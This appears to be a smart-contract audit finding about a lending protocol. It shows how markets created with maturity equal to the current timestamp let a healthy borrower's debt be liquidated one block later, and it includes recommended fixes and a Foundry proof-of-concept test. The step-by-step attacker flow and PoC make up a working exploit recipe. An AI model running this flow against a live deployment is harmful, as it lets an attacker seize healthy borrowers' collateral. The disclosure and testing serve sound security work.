### Title
Debt Created at `maturity == block.timestamp` Is Immediately Liquidatable in the Next Block via Post-Maturity Mode - (File: src/ratifiers/interfaces/ISetterRatifier.sol)

### Summary
`SetterRatifier.isRatified` performs no maturity validation, and `touchMarket` enforces only an upper bound on maturity with no lower bound, allowing a market to be created with `maturity = block.timestamp`. The debt-increase guard in `take` uses `<=` (`block.timestamp <= offer.market.maturity`), so debt creation is permitted at the exact maturity timestamp. One block later, `liquidate` with `postMaturityMode=true` succeeds because its guard uses strict `>` (`block.timestamp > market.maturity`), making any debt created at maturity immediately liquidatable in the next block even for a perfectly healthy position.

### Finding Description

**Code path and root cause:**

`touchMarket` (`src/Midnight.sol:758`) enforces only:
```solidity
require(market.maturity <= block.timestamp + 100 * 365 days, MaturityTooFar());
```
There is no `require(market.maturity > block.timestamp)` or any minimum-maturity guard. A market with `maturity = block.timestamp` is created without error.

`SetterRatifier.isRatified` (`src/ratifiers/SetterRatifier.sol:30-36`) checks only Merkle proof membership and `isRootRatified[offer.maker][root]`. It performs zero validation of `offer.market.maturity`.

In `take` (`src/Midnight.sol:391`):
```solidity
require(block.timestamp <= offer.market.maturity || sellerDebtIncrease == 0, CannotIncreaseDebtPostMaturity());
```
When `maturity = block.timestamp`, the condition `block.timestamp <= block.timestamp` is `true`, so `sellerDebtIncrease > 0` is permitted — debt is created at the exact maturity timestamp.

In `liquidate` (`src/Midnight.sol:622`):
```solidity
postMaturityMode ? block.timestamp > market.maturity : originalDebt > maxDebt
```
One block later (`block.timestamp = maturity + 1`), `block.timestamp > market.maturity` is `true`, so post-maturity liquidation of a healthy borrower succeeds.

**Attacker inputs and exploit flow:**

1. Attacker (maker/lender) constructs an offer with `offer.market.maturity = block.timestamp` and valid collateral params, LLTV, and LIF.
2. Attacker calls `midnight.setIsAuthorized(address(setterRatifier), true, maker)` to authorize the ratifier.
3. Attacker calls `setterRatifier.setIsRootRatified(maker, HashLib.hashOffer(offer), true)` — no privilege required beyond being the maker.
4. In the same block, a taker (victim borrower) calls `midnight.take(offer, ...)` with `units > 0`. The `take` check at line 391 passes (`T <= T`). The `SellerIsLiquidatable` check at line 476 passes if the borrower has sufficient collateral. Debt is written to `sellerPos.debt`.
5. In the next block (`block.timestamp = maturity + 1`), any caller invokes `midnight.liquidate(market, ..., postMaturityMode=true)`. The guard `block.timestamp > market.maturity` is satisfied. The healthy borrower's position is liquidated.

**Why existing checks fail:**

- `touchMarket`: no lower-bound maturity check.
- `SetterRatifier.isRatified`: no maturity check at all.
- `take` line 391: uses `<=` not `<`; the boundary case `maturity == block.timestamp` is not excluded.
- `liquidate` line 622: uses strict `>`; the asymmetry between `<=` in `take` and `>` in `liquidate` creates a one-block window where debt exists but is already post-maturity-liquidatable.
- The protocol's own stated invariant (`live_context.json`) explicitly says: *"maturity boundary must not allow debt increase by rounding, timestamp equality, or callback sequencing"* — this is violated.

### Impact Explanation

A healthy borrower who takes a loan in a market where `maturity = block.timestamp` has their collateral immediately seizable in the next block via `postMaturityMode=true` liquidation, with no opportunity to repay. The LIF at `block.timestamp = maturity + 1` is `WAD + (maxLif - WAD) * 1 / TIME_TO_MAX_LIF` (slightly above 1), so the liquidator receives slightly more collateral than the debt repaid. The borrower suffers an immediate, unavoidable collateral loss on a position that was healthy at the time of borrowing.

### Likelihood Explanation

The preconditions are fully attacker-controlled: any unprivileged address can be a maker, call `setIsRootRatified` on themselves, and construct an offer with `maturity = block.timestamp`. The taker can be a victim who does not inspect the maturity field, or the attacker can be both maker and taker to demonstrate the state. The attack is repeatable in any block and requires no admin action, oracle manipulation, or special privilege. It is executable in a single transaction bundle (set root → take → next block liquidate).

### Recommendation

Two fixes are required:

1. In `touchMarket` (`src/Midnight.sol`), add a minimum maturity guard:
   ```solidity
   require(market.maturity > block.timestamp, MaturityInThePast());
   ```

2. In `take` (`src/Midnight.sol:391`), change `<=` to `<` to exclude the boundary:
   ```solidity
   require(block.timestamp < offer.market.maturity || sellerDebtIncrease == 0, CannotIncreaseDebtPostMaturity());
   ```

Both fixes together close the boundary gap: no market can be created at or before the current timestamp, and even if one somehow existed, debt cannot increase at the exact maturity second.

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {BaseTest} from "./BaseTest.sol";
import {SetterRatifier} from "../src/ratifiers/SetterRatifier.sol";
import {HashLib} from "../src/ratifiers/libraries/HashLib.sol";
import {CollateralParams, Market, Offer} from "../src/interfaces/IMidnight.sol";
import {MAX_TICK} from "../src/libraries/TickLib.sol";

contract MaturityBoundaryBugTest is BaseTest {
    SetterRatifier internal setterRatifier;

    function setUp() public override {
        super.setUp();
        setterRatifier = new SetterRatifier(address(midnight));
    }

    function testDebtAtMaturityImmediatelyLiquidatable() public {
        uint256 units = 100;

        // Build market with maturity == block.timestamp
        Market memory m;
        m.loanToken = address(loanToken);
        m.maturity = block.timestamp; // boundary: maturity == now
        m.collateralParams = new CollateralParams[](1);
        m.collateralParams[0] = CollateralParams({
            token: address(collateralToken1),
            lltv: 0.77e18,
            maxLif: maxLif(0.77e18, 0.25e18),
            oracle: address(oracle1)
        });

        // Lender (maker) constructs a buy offer
        Offer memory offer;
        offer.market = m;
        offer.buy = true;
        offer.maker = lender;
        offer.ratifier = address(setterRatifier);
        offer.maxUnits = type(uint256).max;
        offer.expiry = block.timestamp + 1 hours;
        offer.tick = MAX_TICK;

        bytes32 root = HashLib.hashOffer(offer);

        // Lender authorizes SetterRatifier and ratifies the root
        vm.startPrank(lender);
        midnight.setIsAuthorized(address(setterRatifier), true, lender);
        setterRatifier.setIsRootRatified(lender, root, true);
        vm.stopPrank();

        // Supply collateral for borrower (healthy position)
        collateralize(m, borrower, units);
        deal(address(loanToken), lender, units);

        // Borrower takes the offer in the same block — debt is created at maturity
        vm.prank(borrower);
        midnight.take(offer, abi.encode(root, 0, new bytes32[](0)), units, borrower, borrower, address(0), hex"");

        bytes32 id = midnight.toId(m);
        assertGt(midnight.debtOf(id, borrower), 0, "debt created");
        assertTrue(midnight.isHealthy(m, id, borrower), "borrower is healthy");

        // Warp +1 second: now block.timestamp > market.maturity
        vm.warp(block.timestamp + 1);

        // Post-maturity liquidation succeeds on a healthy position
        deal(address(loanToken), address(this), units);
        midnight.liquidate(m, 0, 0, units, borrower, true, address(this), address(0), "");

        // Assert: borrower's debt is reduced / collateral seized despite being healthy at take time
        assertLt(midnight.debtOf(id, borrower), units, "debt reduced by liquidation");
    }
}
```

**Expected assertions:**
- `debtOf(id, borrower) > 0` after `take` — debt was created at `maturity == block.timestamp`.
- `isHealthy(m, id, borrower) == true` at take time — position was healthy.
- After `vm.warp(+1)`, `liquidate(..., postMaturityMode=true)` does not revert — healthy position is liquidated.
